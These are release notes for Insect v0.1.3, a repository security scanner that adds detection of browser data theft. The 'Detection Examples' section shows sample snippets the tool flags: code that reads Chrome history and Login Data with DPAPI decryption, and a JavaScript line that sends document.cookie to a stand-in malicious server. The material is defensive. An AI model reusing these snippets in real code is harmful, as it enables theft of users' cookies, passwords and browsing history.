# Insect v0.1.3 Release Notes

## 🚀 Major New Feature: Browser Data Theft Detection

This release introduces comprehensive **Browser Data Theft Protection**, a powerful new security analyzer that detects malicious code patterns attempting to steal sensitive browser data.

### 🔒 Browser Theft Analyzer

**New Analyzer**: `BrowserTheftAnalyzer`
- **Purpose**: Detects code patterns that attempt to steal browser data including history, cookies, passwords, and session tokens
- **Languages**: Python, JavaScript, TypeScript, Shell scripts
- **Detection Categories**:
  - Browser history access (`History`, `places.sqlite`)
  - Cookie and session theft (`Cookies`, `document.cookie`)
  - Password extraction (`Login Data`, `key4.db`, `logins.json`)
  - Browser storage manipulation (`localStorage`, `sessionStorage`)
  - Extension API abuse (`chrome.extension`, browser APIs)
  - Session hijacking patterns

### 🎯 Detection Capabilities

**12 New Detection Rules** covering:

1. **Browser History Theft** (BT101-BT103)
   - Chrome/Firefox history database access
   - Cross-platform history extraction
   - Suspicious file path patterns

2. **Password Extraction** (BT104-BT106)
   - Encrypted password database access
   - Windows DPAPI decryption attempts
   - Cross-browser credential theft

3. **Session Hijacking** (BT107-BT108)
   - Cookie enumeration and theft
   - Session token extraction patterns

4. **Storage Manipulation** (BT109-BT110)
   - localStorage/sessionStorage theft
   - Browser storage enumeration

5. **Extension Abuse** (BT111-BT112)
   - Unauthorized extension API usage
   - Malicious extension installation

### 🧪 Comprehensive Testing

**17 Test Cases** ensuring robust detection:
- Browser history access patterns
- Password extraction attempts
- Session hijacking techniques
- Storage manipulation
- Extension API abuse
- Multi-language coverage (Python, JavaScript, Shell)

### ⚙️ Configuration Options

New configuration section in `config/default.toml`:
```toml
[browser_theft]
enable_browser_history_detection = true
enable_browser_storage_detection = true
enable_credential_detection = true
enable_extension_detection = true
```

## 📚 Enhanced Documentation

### 🎨 Jekyll Theme Integration

**Complete Jekyll Documentation Site**:
- **Theme**: Clean, responsive minima theme
- **Navigation**: Organized menu structure with proper ordering
- **SEO**: Optimized with jekyll-seo-tag plugin
- **Features**: RSS feeds, sitemap generation, GitHub Pages ready

**New Documentation Structure**:
1. **Usage Guide** - Comprehensive usage instructions
2. **Security Examples** - Real-world security issue demonstrations
3. **Use Cases** - Practical application scenarios
4. **Advanced Usage** - Custom rules, CI/CD integration, performance optimization
5. **Container Scanning** - Docker container security workflows
6. **Contributing Guide** - Development workflow and contribution guidelines

### 🛡️ Browser Security Documentation

**Expanded Security Examples** including:
- Browser data theft detection examples
- Remediation strategies for browser security issues
- Best practices for legitimate browser interaction
- Privacy-compliant development guidelines

**New Use Cases** covering:
- Browser extension security review workflows
- Open source repository vetting for browser safety
- Web application security scanning
- Supply chain security for web dependencies

## 🔧 Technical Improvements

### 🏗️ Architecture Enhancements

- **Analyzer Registration**: Improved analyzer discovery and registration system
- **Rule Integration**: Seamless integration of browser theft rules into existing static analyzers
- **Multi-language Support**: Enhanced JavaScript and Python static analysis with browser-specific patterns

### 🚀 Performance & Reliability

- **Test Coverage**: 100% test coverage for browser theft detection
- **Error Handling**: Robust error handling for edge cases
- **Documentation**: Comprehensive inline documentation and examples

## 📋 Complete Feature List

### 🆕 New Features

- ✅ **Browser Data Theft Detection** - Comprehensive protection against browser data theft
- ✅ **Jekyll Documentation Site** - Professional documentation with GitHub Pages support
- ✅ **Browser Security Use Cases** - Real-world security scenarios and workflows
- ✅ **Advanced Configuration** - Granular control over browser security detection

### 🔧 Technical Changes

- ✅ **New Analyzer**: `BrowserTheftAnalyzer` with 12 detection rules
- ✅ **Enhanced Rules**: Updated `static_analyzer_rules.py` with browser-specific patterns
- ✅ **Improved Integration**: Better analyzer registration in `__init__.py`
- ✅ **Configuration Updates**: New browser theft settings in `default.toml`

### 📖 Documentation Updates

- ✅ **Jekyll Setup**: Complete Jekyll theme configuration
- ✅ **Security Examples**: Expanded with browser theft detection examples
- ✅ **Usage Guide**: Enhanced with browser security scanning workflows
- ✅ **Advanced Usage**: New browser security configuration sections
- ✅ **Use Cases**: Browser security protection scenarios

## 🛠️ Usage Examples

### Basic Browser Security Scan
```bash
# Scan for browser data theft patterns
insect scan /path/to/repository --severity medium
```

### Browser Extension Security Review
```bash
# Comprehensive browser extension security scan
insect scan /path/to/extension --include-pattern "*.js" --include-pattern "*.html" -f html -o extension-security-report.html
```

### Custom Browser Security Configuration
```toml
[analyzers]
browser_theft = true
secrets = true
static = true

[browser_theft]
enable_browser_history_detection = true
enable_browser_storage_detection = true
enable_credential_detection = true
enable_extension_detection = true

[severity]
min_level = "medium"
```

## 🔍 Detection Examples

**Browser History Theft** - Detects patterns like:
```python
# DETECTED: Browser history access
chrome_path = "~/.config/google-chrome/Default/History"
conn = sqlite3.connect(chrome_path)
cursor.execute("SELECT url, title FROM urls")
```

**Password Extraction** - Identifies attempts like:
```python
# DETECTED: Password database access
login_data = "~/AppData/Local/Google/Chrome/User Data/Default/Login Data"
decrypted = win32crypt.CryptUnprotectData(encrypted_password)
```

**Session Hijacking** - Flags suspicious patterns:
```javascript
// DETECTED: Cookie theft attempt
var stolenCookies = document.cookie;
fetch("http://malicious-server.com/steal", {method: "POST", body: stolenCookies});
```

## 🚀 GitHub Pages Deployment

The documentation is now automatically deployable to GitHub Pages:

1. Enable GitHub Pages in repository settings
2. Set source to "Deploy from a branch" 
3. Choose main branch and `/docs` folder
4. Site will be available at `https://yourusername.github.io/insect`

## 🎯 Security Impact

This release significantly enhances Insect's ability to protect users from malicious repositories that attempt to:
- ❌ Steal browser browsing history
- ❌ Extract saved passwords and credentials  
- ❌ Hijack active sessions and cookies
- ❌ Manipulate browser storage data
- ❌ Abuse browser extension APIs
- ❌ Exfiltrate sensitive user data

## 🔄 Upgrade Instructions

1. **Update Insect**:
   ```bash
   pip install --upgrade insect
   ```

2. **Update Configuration** (Optional):
   ```bash
   # Browser theft detection is enabled by default
   # Customize settings in your config file if needed
   ```

3. **Run Security Scan**:
   ```bash
   insect scan /path/to/repository
   ```

## 🏷️ Version Information

- **Version**: 0.1.3
- **Release Date**: December 2024
- **Compatibility**: Python 3.13+
- **Breaking Changes**: None

## 🙏 Acknowledgments

This release represents a significant enhancement to Insect's security capabilities, focusing on protecting users from browser-based attacks and improving the overall documentation experience.

---

**Full Changelog**: [v0.1.2...v0.1.3](https://github.com/somasays/insect/compare/v0.1.2...v0.1.3)